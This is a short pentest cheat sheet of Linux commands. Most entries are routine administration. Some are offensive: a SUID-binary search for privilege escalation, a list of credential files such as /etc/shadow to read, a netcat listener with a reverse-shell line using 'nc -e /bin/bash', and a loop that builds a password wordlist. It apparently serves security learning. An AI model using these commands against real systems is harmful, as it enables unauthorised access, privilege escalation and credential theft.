To see the currently logged-in user:
- Whoami

To see the current working directory path: 
- pwd

Used to configure a network interface:
- ifconfig
ifconfig eth0 down
ifconfig eth0 up

Release assigned IP address :
- sudo dhclient -r 

Demand an new IP adddress: 
- sudo dhclient

Start/Stop a servive :
- systemctl start SERVICE 
- systemctl stop SERVICE

Change user:
- to root : su root / su -
- to user : su user

Search for a file in all folders:
- find / -type f -name FILENAME 2> /dev/null

To know which file we can execute as root:
- find / -type f -perm -4000 2>/dev/null

important files to see in a pentest: 

/etc/passwd
/etc/shadow
/etc/crontab

Get an RDP connection from Linux to Windows:
- xfreerdp /u:<username> /p:<password> /v:<ip adresse> +clipboard

Open a Web server with python :
- python3 -m http.server

download a file from a web server :
- wget URL:PORT

open port :
- nc -nvlp PORT

afford a shell to a port listening:
- nc IP PORT -e /bin/bash

Creat a loop :
- for year in $(seq 2000 2025);do echo "toto$year" >> pass.txt;done


